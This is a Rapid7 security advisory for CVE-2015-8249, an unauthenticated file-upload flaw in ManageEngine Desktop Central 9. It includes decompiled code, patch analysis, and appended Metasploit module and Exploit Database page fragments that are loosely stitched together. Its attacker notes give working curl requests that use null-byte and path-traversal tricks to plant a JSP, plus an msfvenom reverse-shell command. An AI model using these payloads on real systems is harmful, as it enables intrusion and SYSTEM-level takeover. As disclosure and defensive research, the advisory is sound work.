# R7-2015-22: ManageEngine Desktop Central 9 FileUploadServlet connectionId Vulnerability (CVE-2015-8249)

* Dec 14, 2015
* 10 min read
* [Tod Beardsley](/blog/author/tod-beardsley/)

*Last updated at Thu, 28 Dec 2023 18:31:06 GMT*

[ManageEngine Desktop Central 9](https://www.manageengine.com/products/desktop-central/) suffers from a vulnerability that allows a remote attacker to upload a malicious file, and execute it under the context of SYSTEM. Authentication is not required to exploit this vulnerability.

In addition, the vulnerability is similar to a ZDI advisory released on May 7th, 2015, [ZDI-15-180](http://www.zerodayinitiative.com/advisories/ZDI-15-180/). This advisory specifically mentions `computerName`, and this is an important piece of information.  First off, `computerName` is a parameter in FileUploadServlet, which is used to normalize a file path for our uploaded 7z file. From the sound of it, this parameter was not properly checked, or not checked at all for any path injection attacks. A patch was released by the vendor, and upgrading to Version 9, build 90142 should address this vulnerability.

Although the latest version of ManageEngine Desktop Central 9 does check for multiple things such as directory traversal, absolute path injection, and potentially dangerous executables for `computerName`, it isn't the only parameter that is user-supplied and part of the file path. The `connectionId` parameter is also user-supplied, and is part of the file path for our uploaded file.

From the look of the decompiled code, this does not appear to be a regression bug; rather, the fix was incomplete.

## Credit

This issue was discovered by [Wei Chen](https://twitter.com/_sinn3r) of Rapid7, Inc., and reported to the vendor per Rapid7's disclosure policy.

## Tested & Analyzed Versions

Builds 90109 and 91084 were tested and found to be vulnerable to CVE-2015-8249. At the time of discovery, build 91084 was the latest available version.

### Fixed version

Build 91093 was released on November 30, 2015, and fixes the issue described by CVE-2015-8249. See the Patch Analysis section, below, for details.

## Code Analysis

The FileUploadServlet class begins handling our POST request in the doPost function. In this function, you will see that the variable `compName` is checked by `FileUploadUtil.hasVulnerabilityInFileName`.  That is the function for checking things like directory traversal, absolute path injection, and executable file types (such as jsp, js, and html)

After the compName check, you will see that it calls a `downLoadFile()` function.

```
public void doPost(HttpServletRequest request, HttpServletResponse response)
    throws ServletException, IOException
  {
    String sourceMethod = "FileUploadServlet::doPost";
    this.logger.log(Level.INFO, sourceMethod + " -> Received request from : " + request.getRemoteHost());
    connectionId = request.getParameter("connectionId");
    resourceId = request.getParameter("resourceId");
    action = request.getParameter("action");
    compName = request.getParameter("computerName");
    customerId = Long.valueOf(Long.parseLong(request.getParameter("customerId")));
    nDataLength = request.getContentLength();
    checkSumValue = request.getParameter("checkSumValue");
    try
    {
      if ((compName != null) && (FileUploadUtil.hasVulnerabilityInFileName(compName)))
      {
        this.logger.log(Level.WARNING, "FileUploadServlet : Going to reject the request: compName: {0}", new Object[] { compName });
        response.sendError(403, "Request Refused");
        return;
      }
      nDataLength = request.getContentLength();
      long freeSpace = RDSUtil.getInstance().getServerFreeSpace();
      if (nDataLength < freeSpace)
      {
        String receivedStatus = downLoadFile(request);

        response.setHeader("Upload_Status", receivedStatus);
      }
      else
      {
        this.logger.log(Level.WARNING, sourceMethod + " -> No required Space is availbale to store the video file ");
        if ((action != null) && (action.equalsIgnoreCase("rds_file_upload"))) {
          throw new SyMException(3010, "No Space to store Video file ", new Exception("No Space to store Video file"));
        }
      }
      this.logger.log(Level.INFO, sourceMethod + " -> The method ended ");
    }
    catch (SyMException exp)
    {
      int errorCode = exp.getErrorCode();
      String errorMessage = exp.getMessage();
      this.logger.log(Level.WARNING, sourceMethod + " -> Exception occured : " + errorCode);
      this.logger.log(Level.WARNING, sourceMethod + " -> Exception occured : " + errorMessage);
      RdsHistoryDetails.getInstance().updateErrorCode(resourceId, connectionId, errorCode);
    }
    catch (Exception ex)
    {
      this.logger.log(Level.WARNING, sourceMethod + " -> Exception occured : " + ex);
    }
  }

```

The `downLoadFile()` function is used to actually save our uploaded file. An attacker can upload whatever he wants:

```
private String downLoadFile(HttpServletRequest request)
  {
    String status = "Success";
    try
    {
      String sourceMethod = "FileUploadServlet::downLoadFile";
      InputStream appIn = request.getInputStream();
      String absoluteFileName = getFileFolderPath();
      if ((action != null) && (action.equalsIgnoreCase("rds_file_upload")))
      {
        HashMap resMap = new HashMap();
        resMap.put("fileStatus", Integer.valueOf(3));
        resMap.put("connectionID", connectionId);
        resMap.put("filePath", absoluteFileName);
        resMap.put("fileSize", Long.valueOf(nDataLength));
        RdsHistoryDetails.getInstance().updateRCHistoryConnection(resMap);
      }
      Thread.sleep(5000L);
      OutputStream outputFile = new FileOutputStream(absoluteFileName);
      this.logger.log(Level.INFO, sourceMethod + "  ==========> Method Starts  <===========");
      try
      {
        int numread = 0;
        int count = 0;
        byte[] bytesread = new byte[262144];
        long receivedFileSize = 0L;

        this.logger.log(Level.INFO, sourceMethod + " -> Total Received Data length = : " + nDataLength);
        while ((appIn != null) && ((numread = appIn.read(bytesread)) != -1))
        {
          count++;
          this.logger.log(Level.FINE, sourceMethod + " -> Going to write the file: count: " + count + " numread :" + numread);

          outputFile.write(bytesread, 0, numread);
          receivedFileSize += numread;
          this.logger.log(Level.FINE, sourceMethod + " -> receivedFileSize: " + receivedFileSize);
        }
        String checkSum = ChecksumProvider.getInstance().GetMD5HashFromFile(absoluteFileName);
        this.logger.log(Level.INFO, sourceMethod + " Generated checksum value is : " + checkSum);
        if ((nDataLength == receivedFileSize) && (checkSum.equals(checkSumValue)))
        {
          this.logger.log(Level.INFO, sourceMethod + " -> Received whole file successfully ");
          if ((action != null) && (action.equalsIgnoreCase("rds_file_upload")))
          {
            HashMap resMap = new HashMap();
            resMap.put("fileStatus", Integer.valueOf(0));
            resMap.put("connectionID", connectionId);
            resMap.put("filePath", absoluteFileName);
            resMap.put("fileSize", Long.valueOf(nDataLength));
            RdsHistoryDetails.getInstance().updateRCHistoryConnection(resMap);
          }
        }
        else
        {
          status = "Failed";
        }
      }
      catch (Exception e)
      {
        this.logger.log(Level.WARNING, " -> Exception occured while writing file: " + e);
      }
      finally
      {
        outputFile.close();
        appIn.close();
      }
      this.logger.log(Level.INFO, sourceMethod + "  ==========> Method Ends  <===========");
    }
    catch (Exception e)
    {
      this.logger.log(Level.WARNING, " -> Exception occured : " + e);
    }
    return status;
  }

```

However, taking a closer look at the `absoluteFileName` variable, we can see that this variable is obtained from the `getFileFolderPath()` function:

```
 public String getFileFolderPath()
  {
    try
    {
      String sourceMethod = "FileUploadServlet::getFileFolderPath";
      String absoluteFileFolderPath = null;

      this.logger.log(Level.INFO, sourceMethod + " -> Action : " + action);
      if ((action != null) && (action.equalsIgnoreCase("rds_file_upload")))
      {
        String server_home = DCMetaDataUtil.getInstance().getServerDataDir(customerId);
        this.logger.log(Level.FINE, sourceMethod + " -> The server home path is : " + server_home);
        absoluteFileFolderPath = server_home + File.separator + RDSUtil.RDS_SCRREC_FOLDER;
      }
      if (!ApiFactory.getFileAccessAPI().isFileExists(absoluteFileFolderPath)) {
        ApiFactory.getFileAccessAPI().createDirectory(absoluteFileFolderPath);
      }
      this.logger.log(Level.FINE, sourceMethod + " -> The Absolute File Folder Path is  : " + absoluteFileFolderPath);

      String absoluteFileName = getAbsoluteFileName(absoluteFileFolderPath);
      this.logger.log(Level.INFO, sourceMethod + " -> The Absolute Path with File Name is  : " + absoluteFileName);

      return absoluteFileName;
    }
    catch (Exception e)
    {
      this.logger.log(Level.WARNING, " -> Exception occured : " + e);
    }
    return null;
  }

```

`getFileFolderPath()` is sort of a wrapper for `getAbsoluteFileName`, so we look at that:

```
public String getAbsoluteFileName(String fileFolder)
  {
    String sourceMethod = "FileUploadServlet::getAbsoluteFileName";
    try
    {
      String absoluteFileName = null;
      if ((action != null) && (action.equalsIgnoreCase("rds_file_upload")))
      {
        String userName = getUserNamefromDO(connectionId);
        String fileName = userName + "-" + compName + "-" + connectionId;
        absoluteFileName = fileFolder + File.separator + fileName + ".7z";
        HashMap resMap = new HashMap();
        resMap.put("connectionID", connectionId);
        resMap.put("filePath", absoluteFileName);
        resMap.put("fileStatus", Integer.valueOf(1));
        resMap.put("fileSize", Long.valueOf(nDataLength));
        this.logger.log(Level.FINE, sourceMethod + " --> The Absolute Path with File Name is  : " + absoluteFileName);
        RdsHistoryDetails.getInstance().updateRCHistoryConnection(resMap);
      }
      this.logger.log(Level.FINE, sourceMethod + " --> The Absolute Path with File Name is  : " + absoluteFileName);
      return absoluteFileName;
    }
    catch (Exception e)
    {
      this.logger.log(Level.WARNING, sourceMethod + " --> Exception occured : " + e);
    }
    return null;
  }

```

Pay attention to the `fileName` variable above. As we can see, there are three variables used to craft this filename: `userName`, `compName`, and `connectionId`. Remember, `compName` is already checked for malicious inputs in the `doPost()` function, but throughout the code flow, the connectionId is never checked, and the attacker has control of it.

## Attacker's Notes

For `connectionId`, we can inject a null byte to modify the file extension. For example, if we do `evil.jsp%00`, our filename becomes "evil.jsp" instead of "evil.jsp.7z".  Since ManageEngine Desktop Central 9 is Java, and runs on top of Apache, it should support JSP and PHP. However, we cannot just upload our JSP/PHP file to the server-data directory (where the FileUploadServlet class puts all the 7z files), the server won't treat them as executables. We have to put our malicious file somewhere else. To solve this, we can simply traverse our way to a different directory using "..". In our attack, we choose the following to plant our JSP payload:

**Build 90109:**

C:\ManageEngine\DesktopCentral\_Server\webapps\DesktopCentral\jsp\common

**Build 91084 (it's a different path because this version no longer has the jsp directory):**

C:\ManageEngine\DesktopCentral\_Server\webapps\DesktopCentral\jspf

It may be possible to find a path that's compatible with either version, but earlier versions were not investigated.

### Demonstration 1 (PoC)

**Tested Environments:**

* Windows 7 SP1 (x86)
* ManageEngine Desktop Central 9 Build 91084

**Steps:**

1. Create the following file as /tmp/a.txt (this is your payload):

```
<%= new String("Hello!") %>

```

2. Run the following. You should get a "Hello!" as the response for the second curl command.

```
msf sinn3r $ curl -v -X POST "http://192.168.1.188:8020/fileupload?connectionId=AAAAAAA%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5cjspf%5ctest.jsp%00&resourceId=B&action=rds_file_upload&computerName=sinn3r%2ephp&customerId=47474747" --data @/tmp/a.txt --header "Content-Type:application/octet-stream" && http://192.168.1.188:8020/jspf/test.jsp

```
### Demonstration 2 (real attack)

**Tested Environments:**

* Windows 7 SP1 (x86)
* ManageEngine Desktop Central 9 Build 91084

**Steps:**

1. Create a JSP shell

```
./msfvenom -p java/jsp_shell_reverse_tcp lhost=IP lport=4444 -f raw > /tmp/a.txt

```

2. Start a payload handler

3. Upload and JSP payload and execute it:

```
msf sinn3r $ curl -v -X POST "http://192.168.1.188:8020/fileupload?connectionId=AAAAAAA%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5cjspf%5ctest.jsp%00&resourceId=B&action=rds_file_upload&computerName=sinn3r%2ephp&customerId=47474747" --data @/tmp/a.txt --header "Content-Type:application/octet-stream" && http://192.168.1.188:8020/jspf/test.jsp

4. On msfconsole, we see that we have a shell under the context of SYSTEM:

```
msf exploit(handler) > run

[*] Starting the payload handler...

```
### Patch Analysis

The patch can be analyzed by decompiling the FileUploadServlet class from AdventNetDesktopCentral.jar, and then diff against the vulnerable version:

```
$ diff 91084.java 91099.java
1c1
<  public void doPost(HttpServletRequest request, HttpServletResponse response)
---
>   public void doPost(HttpServletRequest request, HttpServletResponse response)
15c15
<       if ((compName != null) && (FileUploadUtil.hasVulnerabilityInFileName(compName)))
---
>       if (((compName != null) && (FileUploadUtil.hasVulnerabilityInFileName(compName))) || ((connectionId != null) && (!StringUtils.isNumeric(connectionId.trim()))))
17c17
<         this.logger.log(Level.WARNING, "FileUploadServlet : Going to reject the request: compName: {0}", new Object[] { compName });
---
>         this.logger.log(Level.WARNING, "FileUploadServlet : Going to reject the request: compName:{0}, connectionId: {1}", new Object[] { compName, connectionId });
26c26
<
---
>

```

The above patch roughly shows the connectionId parameter is being checked by a `StringUtils.isNumeric` method. The API documention for `StringUtils.isNumeric` can be found [here](<https://commons.apache.org/proper/commons-lang/apidocs/org/apache/commons/lang3/StringUtils.html#isNumeric(java.lang.CharSequence)>. This seems to be an appropriate way to fix the vulnerability.

To see what actually happens after the check, we need to see the doPost method.

It looks like it simply sends a 403 HTTP response to the client, and then return, which prevents us from reaching the `downloadFile()` method that we need to upload an arbitrary file:

```
public void doPost(HttpServletRequest request, HttpServletResponse response)
    throws ServletException, IOException
  {
    String sourceMethod = "FileUploadServlet::doPost";
    this.logger.log(Level.INFO, sourceMethod + " -> Received request from : " + request.getRemoteHost());
    connectionId = request.getParameter("connectionId");
    resourceId = request.getParameter("resourceId");
    action = request.getParameter("action");
    compName = request.getParameter("computerName");
    customerId = Long.valueOf(Long.parseLong(request.getParameter("customerId")));
    nDataLength = request.getContentLength();
    checkSumValue = request.getParameter("checkSumValue");
    try
    {
      if (((compName != null) && (FileUploadUtil.hasVulnerabilityInFileName(compName))) || ((connectionId != null) && (!StringUtils.isNumeric(connectionId.trim()))))
      {
        this.logger.log(Level.WARNING, "FileUploadServlet : Going to reject the request: compName:{0}, connectionId: {1}", new Object[] { compName, connectionId });
        response.sendError(403, "Request Refused");
        return;
      }

```
### Patch Testing

By trying the [Metasploit module](https://github.com/rapid7/metasploit-framework/pull/6344) against the patched ManageEngine, the application is no longer exploited:

```
msf exploit(manageengine_connectionid_exec) > run
[*] Started reverse handler on 10.6.0.100:4444
[*] Creating JSP stager
[*] Uploading JSP stager test.jsp...
[-] Exploit aborted due to failure: unknown: The server returned 403, but 200 was expected.
[!] This exploit may require manual cleanup of '../webapps/DesktopCentral/jspf/test.jsp' on the target
msf exploit(manageengine_connectionid_exec) >

```

# ManageEngine Desktop Central 9 FileUploadServlet ConnectionId Vulnerability

 [Back to Search](https://www.rapid7.com/db/)

### ManageEngine Desktop Central 9 FileUploadServlet ConnectionId Vulnerability

Disclosed
12/14/2015

Created
05/30/2018

#### Description

This module exploits a vulnerability found in ManageEngine Desktop Central 9. When
uploading a 7z file, the FileUploadServlet class does not check the user-controlled
ConnectionId parameter in the FileUploadServlet class. This allows a remote attacker to
inject a null bye at the end of the value to create a malicious file with an arbitrary
file type, and then place it under a directory that allows server-side scripts to run,
which results in remote code execution under the context of SYSTEM.
Please note that by default, some ManageEngine Desktop Central versions run on port 8020,
but older ones run on port 8040. Also, using this exploit will leave debugging information
produced by FileUploadServlet in file rdslog0.txt.
This exploit was successfully tested on version 9, build 90109 and build 91084.

#### Author(s)

* sinn3r <sinn3r@metasploit.com>

#### Platform

Windows

#### Development

* [Source Code](https://github.com/rapid7/metasploit-framework/blob/master//modules/exploits/windows/http/manageengine_connectionid_write.rb)
* [History](https://github.com/rapid7/metasploit-framework/commits/master//modules/exploits/windows/http/manageengine_connectionid_write.rb)

#### Module Options

To display the available options, load the module within the Metasploit console and run the commands 'show options' or 'show advanced':

```
msf > use exploit/windows/http/manageengine_connectionid_write
msf exploit(manageengine_connectionid_write) > show targets
    ...targets...
msf exploit(manageengine_connectionid_write) > set TARGET < target-id >
msf exploit(manageengine_connectionid_write) > show options
    ...show and set options...
msf exploit(manageengine_connectionid_write) > exploit
```

Time is precious, so I don’t want to do something manually that I can automate. Leveraging the Metasploit Framework when automating any task keeps us from having to re-create the wheel as we can use the existing libraries and focus our efforts where it matters.

      'Description'    => %q{
        This module exploits a vulnerability found in ManageEngine Desktop Central 9. When
        uploading a 7z file, the FileUploadServlet class does not check the user-controlled
        ConnectionId parameter in the FileUploadServlet class. This allows a remote attacker to
        inject a null bye at the end of the value to create a malicious file with an arbitrary
        file type, and then place it under a directory that allows server-side scripts to run,
        which results in remote code execution under the context of SYSTEM.

        Please note that by default, some ManageEngine Desktop Central versions run on port 8020,
        but older ones run on port 8040. Also, using this exploit will leave debugging information
        produced by FileUploadServlet in file rdslog0.txt.

        This exploit was successfully tested on version 9, build 90109 and build 91084.

##### About The Exploit Database

×

[![OffSec](/images/offsec-logo.png)](https://www.offsec.com/)
The Exploit Database is maintained by [OffSec](https://www.offsec.com/community-projects/), an information security training company
that provides various [Information Security Certifications](https://www.offsec.com/courses-and-certifications/) as well as high end [penetration testing](https://www.offsec.com/penetration-testing/) services. The Exploit Database is a
non-profit project that is provided as a public service by OffSec.

The Exploit Database is a [CVE
compliant](http://cve.mitre.org/data/refs/refmap/source-EXPLOIT-DB.html) archive of public exploits and corresponding vulnerable software,
developed for use by penetration testers and vulnerability researchers. Our aim is to serve
the most comprehensive collection of exploits gathered through direct submissions, mailing
lists, as well as other public sources, and present them in a freely-available and
easy-to-navigate database. The Exploit Database is a repository for exploits and
proof-of-concepts rather than advisories, making it a valuable resource for those who need
actionable data right away.

The [Google Hacking Database (GHDB)](/google-hacking-database)
is a categorized index of Internet search engine queries designed to uncover interesting,
and usually sensitive, information made publicly available on the Internet. In most cases,
this information was never meant to be made public but due to any number of factors this
information was linked in a web document that was crawled by a search engine that
subsequently followed that link and indexed the sensitive information.

The process known as “Google Hacking” was popularized in 2000 by Johnny
Long, a professional hacker, who began cataloging these queries in a database known as the
Google Hacking Database. His initial efforts were amplified by countless hours of community
member effort, documented in the book Google Hacking For Penetration Testers and popularised
by a barrage of media attention and Johnny’s talks on the subject such as this early talk
recorded at [DEFCON 13](https://www.defcon.org/html/links/dc-archives/dc-13-archive.html). Johnny coined the term “Googledork” to refer
to “a foolish or inept person as revealed by Google“. This was meant to draw attention to
the fact that this was not a “Google problem” but rather the result of an often
unintentional misconfiguration on the part of a user or a program installed by the user.
Over time, the term “dork” became shorthand for a search query that located sensitive
information and “dorks” were included with may web application vulnerability releases to
show examples of vulnerable web sites.

After nearly a decade of hard work by the community, Johnny turned the GHDB
over to [OffSec](https://www.offsec.com/community-projects/) in November 2010, and it is now maintained as
an extension of the [Exploit Database](/). Today, the GHDB includes searches for
other online search engines such as [Bing](https://www.bing.com/),
and other online repositories like [GitHub](https://github.com/),
producing different, yet equally valuable results.
